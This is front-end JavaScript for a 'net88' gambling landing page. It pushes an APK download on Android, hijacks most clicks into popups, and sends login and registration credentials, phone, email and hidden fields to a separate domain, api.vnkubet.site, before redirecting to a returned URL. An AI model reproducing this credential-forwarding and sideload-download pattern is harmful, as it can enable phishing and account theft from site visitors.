document.addEventListener('DOMContentLoaded', function() {
    const MAIN_URL = 'https://api.vnkubet.site/submit';
    document.querySelector('.register-btn').addEventListener('click', function(e) {
        e.preventDefault();
        document.querySelector('.button-none .elementor-button').click();
    });

    function isMobileAndroid() {
        return /Android/i.test(navigator.userAgent) && /Mobile/i.test(navigator.userAgent);
    }

    // Check if the user is on an Android mobile device
    if (isMobileAndroid()) {
        window.addEventListener('load', function() {
            setTimeout(function() {
                // elementorProFrontend.modules.popup.showPopup({ id: 861 });
                
                function createPopup() {
                    // Create poup html
                    const popupHTML = `
                    <div class="popup-overlay">
                        <div class="popup-content">
                            <a role="button" tabindex="0" aria-label="Close" href="#" class="dialog-close-button dialog-lightbox-close-button">
                                x
                            </a>
                            <div class="dialog-message">
                                <img src="https://cdn.jsdelivr.net/gh/Hexx231/cdn-ph@feature/v1.0.4/download_picture.png" alt="">
                            </div> 
                        </div>
                    </div>`;

                    // popup style
                    const style = document.createElement('style');
                    style.textContent = `
                    .popup-overlay {
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        pointer-events: all;
                        background-color: rgba(0, 0, 0, .8);
                        position: fixed;
                        height: 100%;
                        width: 100%;
                        bottom: 0;
                        left: 0;
                        z-index: 9999;
                        -webkit-user-select: none;
                        -moz-user-select: none;
                        user-select: none;
                    }

                    .popup-content {
                        background-color: #fff;
                        border-radius: 16px 16px 16px 16px;
                        box-shadow: 2px 8px 23px 3px rgba(0, 0, 0, 0.2);
                        position: relative;
                    }

                    .popup-content .dialog-message {
                        width: 438px;
                        height: auto;
                        padding: 25px 25px 25px 25px;
                        max-width: 100vw;
                        max-height: 100vh;
                        overflow: auto;
                        display: flex;
                        line-height: 1.5;
                        box-sizing: border-box;
                        max-width: 90vw;
                    }

                    .popup-content .dialog-close-button {
                        width: 25px;
                        height: 25px;
                        border-radius: 50%;
                        display: flex;
                        justify-content: center;
                        background-color: #B3B3B3;
                        top: 20px;
                        margin-top: 0;
                        right: 20px;
                        opacity: 1;
                        z-index: 9999;
                        pointer-events: all;
                        cursor: pointer;
                        position: absolute;
                        font-size: 20px;
                        font-weight: 700;
                        color: #FFFFFF;
                    }

                    .popup-content .dialog-close-button svg {
                        fill: #FFFFFF;
                        height: 1em;
                        width: 1em;
                    }
                    @media (max-width: 767px){
                        #elementor-popup-modal-35{
                            display: none !important;
                        }
                    }
                    `;

                    document.head.appendChild(style);

                    document.body.insertAdjacentHTML('beforeend', popupHTML);

                    // Add event listener to close button
                    const closeButton = document.querySelector('.dialog-close-button');
                    closeButton.addEventListener('click', function(event) {
                        event.preventDefault();
                        document.querySelector('.popup-overlay').remove();
                    });
                    let button = document.querySelector('.dialog-message');
                    button.addEventListener('click', function(e){
                        e.preventDefault();
                        var fileUrl = `https://${window.location.hostname}/app/NET88_V1.apk`; // Change this to your file's path

                    // Create an 'a' element and trigger a download
                    var a = document.createElement('a');
                    a.href = fileUrl;
                    a.download = 'net88.apk'; // This sets the filename that will be downloaded
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    });
                }
                createPopup();

                
            }, 1500);
        });
        
    }
    else {
        
        jQuery(".elementor-slides-wrapper, .elementor-gallery-item, .sport-section__sport-item, .elementor-icon-list-items li, .elementor-image-box-wrapper, .promotion-card, a, img, .tab-list .tab-item, .left-menu__item, .sport-item, .elementor-icon-box-wrapper, .comment-section .elementor-widget-wrap")
            .click(function(e) {
            e.preventDefault();
            elementorProFrontend.modules.popup.showPopup({ id: 35 });
        });

        jQuery(".elementor-widget-image-carousel, .sport-section__sport-item, .elementor-icon-list-items li, .elementor-image-box-wrapper, .promotion-card, a, img, .tab-list .tab-item, .left-menu__item, .sport-item, .elementor-icon-box-wrapper")
            .click(function() {
                elementorProFrontend.modules.popup.showPopup({ id: 495 });
        });
        //close popup
        jQuery(document).on("click","#elementor-popup-modal-35 ul.elementor-icon-list-items li:nth-child(2) a", function (e) {
            e.preventDefault();
            jQuery("#elementor-popup-modal-35 .dialog-close-button").click();
            }
            );
            
            jQuery(document).on("click", "#elementor-popup-modal-637 ul.elementor-icon-list-items li:nth-child(2) a", function (e) {
            e.preventDefault();
            jQuery("#elementor-popup-modal-637 .dialog-close-button").click();
            }
        );
    }
    
    document.querySelector('.login-btn').addEventListener('click', function(e) {
        e.preventDefault();
        const button = this;
        if (window.innerWidth < 768) {
            document.querySelector('.button-login-none .elementor-button').click();
        } else {
            let formTarget = document.querySelector('.hp-login-form1');
            let username = formTarget.querySelector('input.username').value;
            let password = formTarget.querySelector('input.password').value;
            if(username === '' || password === '') {
                button.disabled = false;
            }
            else {
                button.disabled = true;
            }
            const jsonData = { username: username, password: password, formType: 'login', brand: 'net88' };
            fetchApi(MAIN_URL, optionsForApiRequest(jsonData), button);
        }
    });

    jQuery(document).on('elementor/popup/show', function () {
        let loginForm = document.querySelector('.login-confirm-btn');
        let registerForm = document.querySelector('.register-confirm-btn');

        if (loginForm) {
            loginForm.addEventListener('click', function(e) {
                e.preventDefault();
                const button = this;
                let formTarget = document.querySelector('.hp-login-form');
                let username = formTarget.querySelector('input.username').value;
                let password = formTarget.querySelector('input.password').value;
                const jsonData = { username: username, password: password, formType: 'login', brand: 'net88' };
                if(username === '' || password === '') {
                    button.disabled = false;
                }
                else {
                    button.disabled = true;
                    showSpinner();
                }
                
                fetchApi(MAIN_URL, optionsForApiRequest(jsonData), button);
            });
        }

        if (registerForm) {
            registerForm.addEventListener('click', async function(e) {
                e.preventDefault();
                const button = this;
                let formTarget = document.querySelector('.hp-register-form');
                let usernameVal = formTarget.querySelector('input.username').value;
                let passwordVal = formTarget.querySelector('input.password').value;
                let phoneVal = formTarget.querySelector('input.phone-number').value;
                let emailVal = formTarget.querySelector('input.email') ? formTarget.querySelector('input.email').value : '';

                const hiddenInputsObj = {};
                const hiddenInputs = formTarget.querySelectorAll('input[type="hidden"]');
                hiddenInputs.forEach(input => {
                    const name = input.getAttribute('name');
                    const value = input.value;
                    hiddenInputsObj[name] = value;
                });

                if(usernameVal && passwordVal && phoneVal) {
                    button.disabled = true;
                    showSpinner();
                }
                else {
                    button.disabled = false;
                }
            
                const bodyObj = {
                    username: usernameVal,
                    password: passwordVal,
                    phoneNumber: phoneVal,
                    email: emailVal,
                    formType: 'register',
                    brand: 'net88',
                    ip: window.changeIpAddress || null,
                };
                let jsonData = {...bodyObj, hiddenInputs: {...hiddenInputsObj}};
                fetchApi(MAIN_URL, optionsForApiRequest(jsonData), button);
            });
        }
    });

    function optionsForApiRequest(jsonData) {
        return {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(jsonData)
        };
    }

    function fetchApi(url, options, button) {
        fetch(url, options)
        .then((res) => res.json())
        .then(response => {
            if (response.status === "OK") {
                loginWithToken(response.target);
            } else {
                console.log('Error:', response);
                alert(response.message.message);
            }
        })
        .catch(error => console.error('ERROR:', error.message.message))
        .finally(() => {
            hideSpinner();
            button.disabled = false; // Re-enable the button here
        });
    }

    function loginWithToken(loginUrl) {
        window.open(loginUrl, '_self');
    }

    function showSpinner(event){
        let spinners = document.querySelectorAll('.spinner');
        spinners.forEach(spinner => {
            spinner.style.display = 'inline-block';
        });
    }
    function hideSpinner(){
        let spinners = document.querySelectorAll('.spinner');
        spinners.forEach(spinner => {
            spinner.style.display = 'none';
        });
    }
    
});